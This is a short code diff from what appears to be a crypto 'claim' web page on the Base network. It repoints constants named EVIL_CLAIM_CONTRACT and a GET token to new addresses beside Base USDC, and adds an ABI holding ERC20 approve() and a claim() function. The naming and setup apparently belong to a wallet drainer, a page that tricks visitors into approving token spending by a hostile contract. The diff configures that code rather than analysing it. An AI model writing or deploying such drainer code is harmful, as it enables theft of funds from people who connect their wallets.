@@ -145,13 +145,14 @@
 
     let provider, signer;
 
-    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
-    const EVIL_CLAIM_CONTRACT = "0x947A3CbB49401Aa8B89c47A16B09a0111DCe916c";
-    const GET_TOKEN_ADDRESS = "0x4f930C6Ccda4202115ca0538011AD32B199D889D";
+    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
+    const GET_TOKEN_ADDRESS = "0x945e76f9c5C7053D58C53369a6F7861c96b08B2d"; // ✅ your GET token
+    const EVIL_CLAIM_CONTRACT = "0xE065DD4EAF7Fe18c9470764010a49a5062b5F5FB"; // ✅ your claim contract
 
     const ERC20_ABI = [
       "function approve(address spender, uint256 amount) external returns (bool)"
     ];
+
     const EVIL_ABI = [
       "function claim() external",
       "event ClaimAttempt(address indexed user)",
